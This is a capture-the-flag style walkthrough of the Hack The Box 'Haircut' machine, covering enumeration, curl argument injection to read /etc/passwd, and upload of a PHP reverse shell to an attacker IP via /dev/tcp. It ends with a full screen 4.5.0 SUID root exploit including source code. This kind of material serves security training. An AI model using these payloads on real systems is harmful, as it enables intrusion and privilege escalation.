---
layout: default
---

# Haircut

# Enumeration

IP → 10.10.10.24

Opened ports

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo4pezhJs9c3u8vPWIL9eW4qxQOrHCslAdMftg/p1HDLCKc+9otg+MmQMlxF7jzEu8vJ0GPfg5ONRxlsfx1mwmAXmKLh9GK4WD2pFbg4iFiAO/BAUjs3dNdR1S9wR6F+yRc2jgIyKFJO3JohZZFnM6BrTkZO7+IkSF6b3z2qzaWorHZW04XHdbxKjVCHpU5ewWQ5B32ScKRJE8bsi04Z2lE5vk1NWK15gOqmuyEBK8fcQpD1zCI6bPc5qZlwrRv4r4krCb1h8zYtAwVnoZdtYVopfACgWHxqe+/8YqS8qo4nPfEXq8LkUc2VWmFztWMCBuwVFvW8Pf34VDD4dEiIwz
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLrPH0YEefX9y/Kyg9prbVSPe3U7fH06/909UK8mAIm3eb6PWCCwXYC7xZcow1ILYvxF1GTaXYTHeDF6VqX0dzc=
|   256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA+vUE7P+f2aiWmwJRuLE2qsDHrzJUzJLleMvKmIHoKM
80/tcp open  http    syn-ack nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

### Fuzzing

### Files

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut/enumeration]
└─$ gobuster dir -w ~/SecLists/Discovery/Web-Content/raft-large-files.txt --url http://10.10.10.24 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.24
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 144]
/test.html            (Status: 200) [Size: 223]
/.                    (Status: 301) [Size: 194] [--> http://10.10.10.24/./]
Progress: 25359 / 37051 (68.44%)[ERROR] parse "http://10.10.10.24/directory\t\te.g.": net/url: invalid control character in URL
Progress: 37050 / 37051 (100.00%)
===============================================================
Finished
===============================================================
```

### Common

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut/enumeration]
└─$ gobuster dir -w ~/SecLists/Discovery/Web-Content/common.txt --url http://10.10.10.24 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.24
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 144]
/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
Progress: 4723 / 4724 (99.98%)
===============================================================
Finished
===============================================================
```

### Directories

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://10.10.10.24 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.24
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
Progress: 220547 / 220548 (100.00%)
===============================================================
Finished
===============================================================
```

### Domains

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut]
└─$ gobuster vhost -w domains.txt  --append-domain --url http://htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        domains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 959 / 960 (99.90%)
===============================================================
Finished
===============================================================
```

### Curl page

There a route called `exposed.php` that allow us to make curl request to any URL we want.

Checking [https://gtfobins.github.io/gtfobins/curl/](https://gtfobins.github.io/gtfobins/curl/) we can see what kind of things we can do with cURL. Basically wiht cURL we can read and write files (upload files and download files)

- We cannot inject any command, altough we can try to fuzz for special chars and see if any gives us a positive result

It seems the it let us add parameters to the curl command that is being executed under the hood.

# Foothold

### Reading files

Let’s try and read the /etc/passwd file. 

- `http://10.10.14.5/test.html -X POST -d "@/etc/passwd"`

```bash
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/falsesyslog:x:104:108::/home/syslog:/bin/false_apt:x:105:65534::/nonexistent:/bin/falselxd:x:106:65534::/var/lib/lxd/:/bin/falsemessagebus:x:107:111::/var/run/dbus:/bin/falseuuidd:x:108:112::/run/uuidd:/bin/falsednsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/falsemaria:x:1000:1000:maria,,,:/home/maria:/bin/bashmysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/falselightdm:x:111:118:Light Display Manager:/var/lib/lightdm:/bin/falsepulse:x:112:121:PulseAudio daemon,,,:/var/run/pulse:/bin/falsesshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
```

The format is not the bset one but we have something to read file in th server

Now lets read nginx config to know where is he absolute path for the web site.

```bash
### You should look at the following URL's in order to grasp a solid understanding# of Nginx configuration files in order to fully unleash the power of Nginx.# http://wiki.nginx.org/Pitfalls# http://wiki.nginx.org/QuickStart# http://wiki.nginx.org/Configuration## Generally, you will want to move this file somewhere, and start with a clean# file but keep this around for reference. Or just disable in sites-enabled.## Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.### Default server configuration#server {   listen 80 default_server;       listen [::]:80 default_server;  # SSL configuration     #       # listen 443 ssl default_server;        # listen [::]:443 ssl default_server;       #       # Note: You should disable gzip for SSL traffic.        # See: https://bugs.debian.org/773332   #       # Read up on ssl_ciphers to ensure a secure configuration.      # See: https://bugs.debian.org/765782   #       # Self signed certs generated by the ssl-cert package       # Don't use them in a production server!        #       # include snippets/snakeoil.conf;       root /var/www/html;     # Add index.php to the list if you are using PHP        index index.html index.htm index.nginx-debian.html; server_name _;  location / {            # First attempt to serve request as file, then          # as directory, then fall back to displaying a 404.             try_files $uri $uri/ =404; # autoindex on;  }       # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #       location ~ \.php$ {             include snippets/fastcgi-php.conf;      #       #       # With php7.0-cgi alone:        #       fastcgi_pass 127.0.0.1:9000;        #       # With php7.0-fpm:              fastcgi_pass unix:/run/php/php7.0-fpm.sock;     }       # deny access to .htaccess files, if Apache's document root     # concurs with nginx's one      #       #location ~ /\.ht { #       deny all;       #}}# Virtual Host configuration for example.com## You can move that to a different file under sites-available/ and symlink that# to sites-enabled/ to enable it.##server {#     listen 80;#     listen [::]:80;##   server_name example.com;##      root /var/www/example.com;#     index index.html;##     location / {#           try_files $uri $uri/ =404;#     }#}
```

From this code we can infier that the root is /var/www/html, let’s check this out by getting a file from that route like index.html.

```bash
POST /test.html HTTP/1.1
Host: 10.10.14.5
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

<!DOCTYPE html><title> HTB Hairdresser </title><center> <br><br><br><br><img src="bounce.jpg" height="750" width="1200" alt="" /><center>
```

And we have a hit, so maybe we can download a php file to that route and execute it.

### Uploading a PHP file

- `http://10.10.14.5/rev.php -o ./uploads/rev_web.php`

Actually we could specify the route as a relative path and it should work, we don’t need to know the absolute path of the server. We have to write in the uploads directory, otherwise we will receive a permission error message. This directory was found during the fuzzing phase.

![Untitled](Haircut%2074f35b16aa6e4aeeb4863877bb5be4e1/Untitled.png)

We can execute php code and shell commands so we should be able to have a shell.

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut]
└─$ cat rev.php 
<?php system('bash -c "bash -i >& /dev/tcp/10.10.14.5/443 0>&1"'); ?>
```

Uploading this file and accessing it allow us to get a shell.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.24] 43868
bash: cannot set terminal process group (1220): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html/uploads$ whoami
whoami
www-data
```

### Command injection

To inject a command we can use the following paylaod

- `http://localhost/`<command>``

# Privilege escalation

### Strange file in maria home directory

```bash
www-data@haircut:/home/maria/.tasks$ cat task1 
#!/usr/bin/php
<?php
$mysql_id = mysql_connect('127.0.0.1', 'root', 'passIsNotThis');
mysql_select_db('taskmanager', $mysql_id);
?>
```

Inside the MYSQL we cannot see the database with name **taskmanager**.

```bash
www-data@haircut:/home/maria/.tasks$ mysql -uroot -ppassIsNotThis -h127.0.0.1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.7.18-0ubuntu0.16.04.1 (Ubuntu)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

### Screen 4.5.0

If we find suid files we have a very strange one.

```bash
www-data@haircut:/dev/shm$ find / -perm -4000 2>/dev/null -ls
    53377    140 -rwsr-xr-x   1 root     root       142032 Jan 28  2017 /bin/ntfs-3g
    52805     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
    53367     32 -rwsr-xr-x   1 root     root        30800 Jul 12  2016 /bin/fusermount
    52955     40 -rwsr-xr-x   1 root     root        40128 May  4  2017 /bin/su
    52791     40 -rwsr-xr-x   1 root     root        40152 Dec 16  2016 /bin/mount
    52804     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
    52839     28 -rwsr-xr-x   1 root     root        27608 Dec 16  2016 /bin/umount
   262400    136 -rwsr-xr-x   1 root     root       136808 Jan 20  2017 /usr/bin/sudo
   273351     24 -rwsr-xr-x   1 root     root        23376 Jan 18  2016 /usr/bin/pkexec
   266457     36 -rwsr-xr-x   1 root     root        32944 May  4  2017 /usr/bin/newuidmap
   266260     40 -rwsr-xr-x   1 root     root        39904 May  4  2017 /usr/bin/newgrp
   266765     36 -rwsr-xr-x   1 root     root        32944 May  4  2017 /usr/bin/newgidmap
   267324     76 -rwsr-xr-x   1 root     root        75304 May  4  2017 /usr/bin/gpasswd
   273121     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
   267325     56 -rwsr-xr-x   1 root     root        54256 May  4  2017 /usr/bin/passwd
   268146   1552 -rwsr-xr-x   1 root     root      1588648 May 19  2017 /usr/bin/screen-4.5.0
   267327     40 -rwsr-xr-x   1 root     root        40432 May  4  2017 /usr/bin/chsh
   267323     52 -rwsr-xr-x   1 root     root        49584 May  4  2017 /usr/bin/chfn
   265697     40 -rwsr-xr-x   1 root     root        38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   272188     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    28123    204 -rwsr-xr-x   1 root     root         208680 Apr 29  2017 /usr/lib/snapd/snap-confine
   265195     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   267345    420 -rwsr-xr-x   1 root     root         428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
    26270     16 -rwsr-xr-x   1 root     root          14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
```

screen 4.5.0 is suid and there is a well-know vulnerability with this version.

To exploited we have to follow the steps in the exploit [https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154). 

- Create libhax.c and compile libhax.so

```bash
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut/privesc]
└─$ gcc -fPIC -shared -ldl -o libhax.so libhax.c
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
```

- Create rootshell.c and compile rootshell

```bash
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```bash
┌──(kali㉿kali)-[~/machines/linux/haircut/privesc]
└─$ gcc -o rootshell rootshell.c -static
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
```

- Transfer this file to the tmp directory and explooit the vuln.

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

And we have a shell as root.

```bash
www-data@haircut:/etc$ /tmp/rootshell 
# whoami
root
```